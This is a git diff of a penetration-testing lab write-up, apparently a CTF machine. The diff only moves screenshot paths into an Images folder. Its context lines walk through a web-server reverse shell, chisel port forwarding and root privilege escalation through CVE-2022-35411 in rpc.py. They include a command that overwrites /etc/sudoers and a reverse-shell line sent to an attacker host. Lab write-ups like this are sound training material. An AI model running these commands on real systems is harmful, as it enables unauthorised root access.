@@ -37,22 +37,22 @@ Nmap done: 1 IP address (1 host up) scanned in 40.19 seconds
 ```
 
 Visiting web server on port 8000. We can run commands here.
-![](PC1.png)
+![](Images/PC1.png)
 So we get the reverse shell.
-![](PC2.png)
-![](PC3.png)
+![](Images/PC2.png)
+![](Images/PC3.png)
 
 Let’s check privilege escalations using LinPEAS.sh
-![](PC4.png)
-![](PC5.png)
+![](Images/PC4.png)
+![](Images/PC5.png)
 From the linpeas result, we notice local port 65432 that we did not discover from nmap result.
-![](PC6.png)
+![](Images/PC6.png)
 However we did not know what service it running, we tried to do reverse port forwarding via chisel and use nmap to scan the port, but can’t tell what service it running.
 Make sure both machines running the same chisel version. A port forward cheat sheet can be found [here](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel#bkmrk-github). To do the individual port forwarding. Follow below step.
 
 First we downloaded chisel directly using kali but after transferred it to the victim, it gave error while running. Because attacker and victim were not using the same chisel.
-![](PC7.png)
-![](PC8.png)
+![](Images/PC7.png)
+![](Images/PC8.png)
 So we downloaded the older version of chisel using below link.
 ```sh
 wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
@@ -63,11 +63,11 @@ chmod +x chisel_old
 
 
 Previously typing only `chisel` works but now we need to type `./chisel` because previous version was installed in system path and this new version is installed locally.
-![](PC9.png)
+![](Images/PC9.png)
 Attacker machine
-![](PC10.png)
+![](Images/PC10.png)
 Before turning on the server, transfer the chisel to victim and give permission to it.
-![](PC11.png)
+![](Images/PC11.png)
 #At kali machine, the --port is for chisel client to connect to chisel server, you may use any port you like
 ```sh
 ./chisel_old server -p 8001 --reverse
@@ -77,11 +77,11 @@ Before turning on the server, transfer the chisel to victim and give permission 
 ./chisel_old client ./chisel_old client 192.168.45.234:8001 R:65432:127.0.0.1:65432
 ```
 Victim machine
-![](PC12.png)
+![](Images/PC12.png)
 Attacker machine
-![](PC13.png)
+![](Images/PC13.png)
 check if port forward to our kali machine.
-![](PC14.png)
+![](Images/PC14.png)
 Then you can just run `nmap -p 65432 127.0.0.1 -A` to enumerate the port. As per below.
 ```sh
 nmap -sV -p 65432 127.0.0.1 -A -sT
@@ -106,15 +106,15 @@ Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
 ### ## Privilege Escalation
 
 From linpeas result, we also notice root running something unusual.
-![](PC15.png)
+![](Images/PC15.png)
 Why do we say it is unusual?
 
 Because it is located at `/opt`. `/opt` is intended to hold additional (optional) software and packages that are not part of the default installation.
 
 Let’s check on the rpc.py. We notice it running RPC on the local port 65432. We then google “rpc.py exploit” and found CVE-2022–35411.
 https://www.exploit-db.com/exploits/50983
-![](PC16.png)
-![](PC17.png)
+![](Images/PC16.png)
+![](Images/PC17.png)
 Since the rpc.py is run by root, if we can exploit the vulnerability, we can get a root shell.
 
 Checking on the exploit, we need to change the `exec_command` to whatever command we want, and run that exploit at the target machine. So I change to
@@ -122,20 +122,20 @@ Checking on the exploit, we need to change the `exec_command` to whatever comm
 exec_command(‘echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers’)
 ```
 You may change to whichever payload you want, like `sh -i >& /dev/tcp/$KaliIP/80 0>&1`. Transfer the exploit to the target machine, chmod +x exploit.py and execute it.
-![](PC19.png)
+![](Images/PC19.png)
 
-![](PC18.png)
+![](Images/PC18.png)
 Transfer the exploit to the victim machine.
-![](PC20.png)
-![](PC21.png)
+![](Images/PC20.png)
+![](Images/PC21.png)
 **Remove all the 3D from exploit and run it. Because..**
-![](PC22.png)
+![](Images/PC22.png)
 **Now, we face error in our payload. So we changed it following below steps.**
 
-![](PC23.png)
-![](PC24.png)
-![](PC25.png)
+![](Images/PC23.png)
+![](Images/PC24.png)
+![](Images/PC25.png)
 We ran the exploit and this time also we face the error. we changed it following below steps and run it and we got the user shell.
-![](PC26.png)
-![](PC27.png)
-![](PC28.png)
+![](Images/PC26.png)
+![](Images/PC27.png)
+![](Images/PC28.png)
